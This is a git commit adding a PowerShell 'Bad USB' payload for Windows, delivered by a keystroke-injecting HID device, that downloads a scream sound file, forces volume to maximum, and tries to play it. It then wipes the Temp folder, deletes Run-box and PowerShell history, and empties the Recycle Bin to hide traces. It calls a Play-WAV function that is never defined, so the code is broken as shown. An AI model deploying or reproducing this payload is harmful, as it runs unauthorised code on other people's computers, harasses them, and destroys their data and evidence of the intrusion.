156212089be69cf89710f010726c14ce72a4863b
ItsChuckLex <121667748+ItsChuckLex@users.noreply.github.com>
2022-12-30 12:12:23 +0100

    Add files via upload

---
+++ Sound/sound.ps1
@@ -0,0 +1,81 @@
+﻿#########################################################################################################################################################
+#                                 #  ⠀
+#                                 #  ⠀⣀⣶⣿⣿⣿⣿⣶⣆⡀⠀⠀⠀ ⣶⣶⣶⣶⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⣶⣶⣶⣶⡶⠀⠀⠀⠀⠀⠀⠀ ⣶⣶⣶⣶⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#                                 # ⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀ ⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#   Titel: Sound                  # ⣸⣿⣿⣿⣿⠃⠀⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣯⣴⣾⣿⣷⣶⡄⠀⢰⣶⣶⣶⣶⡆⠀⣶⣶⣶⣶⣶⠀⠀⢀⣠⣶⣾⣿⣿⣶⣶⣄⠀⠀⠀⣿⣿⣿⣿⣇⠀⣶⣶⣶⣶⠃⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⣷⣶⣦⡀⠀⠀⣷⣶⣶⣶⠀⢀⣶⣶⣶⣶⠂
+#   Decribtion: Background sound  # ⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⠛⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⢀⣾⣿⣿⣿⡟⠻⣿⣿⣿⣷⠀⠀⣿⣿⣿⣿⣷⣼⣿⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⣸⣿⣿⣿⣿⠛⣿⣿⣿⣿⣆⠀⢸⣿⣿⣿⡆⢸⣿⣿⣿⡟⠀
+#   Author: ChuckLex              # ⣿⣿⣿⣿⣿⠀⠀⠿⠿⠿⠿⠿⠃⠀⣿⣿⣿⣿⡇⠀⣽⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⡗⠀⣿⣿⣿⣿⣿⠀⠀⢿⣿⣿⣷⣾⣿⣿⣿⠁⠀
+#   Version: 1.0                  # ⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣿⣿⣿⣿⡇⠀⣸⣿⣿⣿⣿⠀⠸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⠉⠉⠉⠉⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⡏⠀⠀
+#   Category: Bad Usb             # ⣿⣿⣿⣿⣿⠀⠀⣤⣤⣤⣤⣤⠄⠀⣿⣿⣿⣿⡇⠀⢼⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀ ⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⣿⠛⠛⠛⠛⠛⠛⠀⠀⢀⣿⣿⣿⣿⣿⣿⡇⠀⠀
+#   Target: Windows               # ⢿⣿⣿⣿⣿⠄⠀⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⡇⠀⢺⣿⣿⣿⣿⠀⢰⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣶⣶⣶⣶⡆⠀⣿⣿⣿⣿⡿⣿⣿⣿⣿⡆⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⡯⠀⢸⣿⣿⣿⣿⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡀⠀
+#   Mode: HID                     #⠀⢻⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⡇⠀⣻⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⠸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⠃⠀⣿⣿⣿⣿⡇⢹⣿⣿⣿⣷⠀⠀⣿⣿⣿⣿⣿⣤⣤⣤⠀⣿⣿⣿⣿⣷⠀⢸⣿⣿⣿⣿⠀⢠⣿⣿⣿⡏⢻⣿⣿⣿⣇⠀
+#                                 #⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⣿⣿⣿⣿⣇⠀⣽⣿⣿⣿⣿⠀⠀⢿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⠀⠀⠻⣿⣿⣿⣿⣾⣿⣿⣿⠏⠀⠀⣿⣿⣿⣿⡇⠈⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠘⢿⣿⣿⣿⣷⣿⣿⣿⡿⠃⠀⣼⣿⣿⣿⠃⠸⣿⣿⣿⣿⡄
+#                                 #⠀  ⠈⠹⠿⠿⠿⠿⠿⠉⠀⠀⠀⠀ ⠿⠿⠿⠿⠏⠀⠹⠿⠿⠿⠿⠀⠀⠈⠹⠿⠿⠏⠁⠿⠿⠿⠿⠿⠀⠀⠀⠈⠹⠿⠿⠿⠿⠏⠁⠀⠀⠀⠿⠿⠿⠿⠏⠀⠹⠿⠿⠿⠿⠀ ⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠉⠿⠿⠿⠿⠿⠉⠀⠀⠀⠿⠿⠿⠿⠀⠀⠿⠿⠿⠿⠇
+#                                 #⠀⠀⠀  ⠀⠀⠀      
+###########################################################################################################################################################
+#----------------------------------------------------------------------------------------------------
+
+<#
+.NOTES 
+	This script will execute a sound file with maximum volume
+    Bitly-Link: 
+#>
+
+#----------------------------------------------------------------------------------------------------
+
+# Download WAV file; replace link to $wav to add your own sound
+
+$wav = "https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG/Payloads/OMG-JumpScare/female_scream.wav?raw=true"
+
+$w = -join($wav,"?dl=1")
+iwr $w -O $env:TMP\s.wav
+
+#----------------------------------------------------------------------------------------------------
+
+<#
+.NOTES 
+	This is to pause the script until a mouse movement is detected
+#>
+
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+#----------------------------------------------------------------------------------------------------
+
+# This turns the volume up to max level and start the .wav
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+Play-WAV
+
+#----------------------------------------------------------------------------------------------------
+
+#Clear
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+#----------------------------------------------------------------------------------------------------
